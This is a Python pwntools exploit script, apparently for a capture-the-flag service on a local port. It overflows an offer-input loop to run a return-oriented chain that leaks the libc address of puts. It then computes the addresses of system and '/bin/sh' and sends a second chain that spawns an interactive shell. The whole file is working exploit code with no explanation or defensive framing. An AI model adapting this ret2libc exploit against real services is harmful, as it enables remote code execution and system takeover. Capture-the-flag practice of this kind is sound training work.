from pwn import *
import sys
import pexpect
import pexpect.fdpexpect
from binascii import hexlify


host = '127.0.0.1'
port = 4000

e = elf.ELF('libc.so.6')
offset = e.symbols['system'] - e.symbols['puts']
binsh_offset = next(e.search("/bin/sh")) - e.symbols['puts']

conn = remote(host, port)

raw_input()

gadget = 0x4015f3  # pop rdi; ret; # 4199923
puts_got = 0x602020 # 6299680
puts_plt = 0x400800 # 4196352
main = 0x401496 # 4199574


def offer_value(x):
    print conn.recvuntil("offer?")
    conn.sendline("{0}".format(x))

def exploit(ip, port, flag_id):
    content = "test"

    print conn.recvuntil("?: ")
    conn.sendline("3")
    print conn.recvuntil("ID: ")
    conn.sendline("XEzLoLpBfSIdBYw")
    print conn.recvuntil("?: ")

    conn.sendline("1")
    conn.sendline("6299690")
    print conn.recvuntil("?: ")
    conn.sendline("1")    

    for i in range(125):
        offer_value(2)


    offer_value(gadget)
    offer_value(puts_got)
    offer_value(puts_plt)
    offer_value(main - 2)
    offer_value(main - 1)

    msg = conn.recvuntil("?: ")

    print msg

    msg = msg[msg.find("\n1)") - 6: msg.find("\n1)")]
    print msg 
    puts_in_libc = "\x00\x00"+msg[5]+msg[4]+msg[3]+msg[2]+msg[1]+msg[0]
    print hexlify(puts_in_libc)
    puts_in_libc_int = int(enhex(puts_in_libc), 16)

    system_in_libc = puts_in_libc_int + offset
    binsh_in_libc = puts_in_libc_int + binsh_offset

    conn.sendline("3")
    print conn.recvuntil("ID: ")
    conn.sendline("XEzLoLpBfSIdBYw")
    print conn.recvuntil("?: ")

    conn.sendline("1")
    conn.sendline("421206250831408")
    print conn.recvuntil("?: ")
    conn.sendline("1")    

    for i in range(125):
        offer_value(2)

    offer_value(gadget)
    offer_value(binsh_in_libc)
    offer_value(system_in_libc)
    offer_value(10)
    offer_value(15)

    conn.interactive()

    return {'FLAG': content}


if __name__ == "__main__":
    print exploit(host, port, "asdasd")
